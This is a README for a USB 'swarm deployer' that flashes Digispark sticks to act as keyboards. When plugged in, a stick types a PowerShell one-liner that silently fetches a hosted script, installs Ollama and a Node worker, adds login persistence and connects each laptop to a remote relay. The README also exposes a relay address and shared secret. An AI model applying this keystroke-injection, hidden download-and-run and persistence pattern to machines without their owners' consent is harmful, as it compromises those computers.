# 🐝 Aries USB Swarm Deployer

Deploy Ollama + Aries swarm worker onto **100 old Windows laptops** using a $2 Digispark ATtiny85 USB stick. Plug in, wait 5 seconds, walk away. Each laptop auto-detects its hardware, downloads the right model, and joins the swarm.

## How It Works

1. **Digispark plugs in** → acts as USB keyboard
2. **Opens Run dialog** (Win+R) → types a PowerShell one-liner → Enter
3. **PowerShell payload runs hidden** — no visible windows:
   - Detects RAM/CPU/GPU
   - Installs Ollama to user-space (no admin needed)
   - Pulls the right model for the hardware
   - Downloads portable Node.js + worker script
   - Starts the swarm worker
   - Sets up persistence (auto-start on login)
4. **Laptop joins the Aries swarm** and starts accepting tasks

**Time per laptop: ~2-5 minutes** (mostly model download). Digispark is done in 5 seconds — you can move to the next laptop immediately while the first one finishes setup in the background.

## Parts List

| Item | Qty | Price | Link |
|------|-----|-------|------|
| Digispark ATtiny85 USB | 100 | ~$1.50 each | [AliExpress 50-pack](https://aliexpress.com/item/1005005066209498.html) |
| Micro USB cable (for flashing) | 1 | $3 | Any you have lying around |

**Total cost: ~$150 for 100 deployers**

## Setup

### 1. Flash the Digispark

**One-time Arduino IDE setup:**

1. Install [Arduino IDE](https://www.arduino.cc/en/software)
2. Go to **File → Preferences**
3. Add to **Additional Board Manager URLs**:
   ```
   http://digistump.com/package_digistump_index.json
   ```
4. Go to **Tools → Board → Boards Manager**
5. Search **"Digistump"** → Install **Digistump AVR Boards**
6. Select **Tools → Board → Digispark (Default - 16.5 MHz)**

**Flash the sketch:**

1. Open `digispark.ino` in Arduino IDE
2. **Edit the `PAYLOAD_CMD`** — replace `YOUR_RAW_URL` with your hosted URL
3. Click **Upload** (do NOT plug in the Digispark yet)
4. When it says "Plug in device now...", plug in the Digispark
5. Wait for "Upload complete" — done
6. Repeat for all 100 Digisparks (or flash one and clone with a programmer)

### 2. Host the Payload

**Option A: GitHub (easiest)**
1. Push `payload.ps1` and `worker.js` to a GitHub repo
2. Use the raw URLs:
   - `https://raw.githubusercontent.com/YOU/REPO/main/payload.ps1`
   - `https://raw.githubusercontent.com/YOU/REPO/main/worker.js`
3. Update `PAYLOAD_CMD` in `digispark.ino` and `$WORKER_URL` in `payload.ps1`

**Option B: Self-hosted**
1. Host the files on any HTTPS server
2. Update the URLs in the scripts accordingly

### 3. Configure

Edit the variables at the top of `payload.ps1`:

```powershell
$SWARM_RELAY   = "https://gateway.doomtrader.com:9700"  # Your relay
$SWARM_SECRET  = "aries-swarm-jdw-2026"                 # Shared secret
$WORKER_URL    = "https://your-url/worker.js"            # Worker script URL
```

Or override via environment variables: `ARIES_RELAY`, `ARIES_SECRET`, `ARIES_WORKER`.

### 4. Deploy

1. Walk up to laptop
2. Plug in Digispark
3. Wait for 3 LED blinks (~5 seconds)
4. Remove Digispark, move to next laptop
5. Laptop finishes setup in background (~2-5 min)

## Model Selection

| RAM | Model | Size | Speed |
|-----|-------|------|-------|
| 2-4 GB | tinyllama:1.1b | ~700MB | Fast, basic |
| 4-8 GB | phi3:mini | ~2.3GB | Good quality |
| 8-16 GB | llama3:8b | ~4.7GB | Great quality |
| 16+ GB | mistral:7b | ~4.1GB | Best quality |

## File Structure

```
usb-swarm/
├── config.json      # Deployer configuration
├── payload.ps1      # PowerShell setup script (runs on target)
├── worker.js        # Node.js swarm worker (runs on target)
├── digispark.ino     # Arduino sketch for Digispark ATtiny85
├── ducky.txt        # DuckyScript version (Rubber Ducky / Flipper)
└── README.md        # This file
```

## What Gets Installed (on each laptop)

All in `%LOCALAPPDATA%`:
```
%LOCALAPPDATA%\Ollama\              # Ollama binary
%LOCALAPPDATA%\aries-swarm\         # Worker files
  ├── worker.js                     # Swarm worker
  ├── env.json                      # Config (relay URL, hardware info)
  ├── launcher.ps1                  # Startup script
  ├── node\node.exe                 # Portable Node.js
  ├── setup.log                     # Setup log
  └── worker.log                    # Worker log
```

## Troubleshooting

**Digispark not recognized by Arduino IDE:**
- Install Digistump drivers: https://github.com/digistump/DigistumpArduino/releases
- On Windows, you may need to install the libusb driver via Zadig

**Payload doesn't run:**
- Some keyboards layouts differ. Digispark types US layout by default
- Make sure the laptop isn't locked / is at a desktop
- Check if PowerShell execution policy is blocked by Group Policy (the `-ep bypass` flag handles normal cases)

**Ollama install fails:**
- The installer uses `/CURRENTUSER` flag for user-space install
- If the org blocks .exe downloads, pre-install Ollama manually

**Worker can't reach relay:**
- Check firewall / network — port 9700 must be reachable
- Worker auto-retries on connection failure

**Model pull is slow:**
- Expected on slow networks. The worker starts after pull completes.
- On very slow connections, consider pre-loading models via USB drive

## Security Notes

- All traffic to relay uses HTTPS
- Shared secret authenticates workers
- No admin privileges required or requested
- All files in user space — no system modification
- Workers only respond to tasks from the authenticated relay
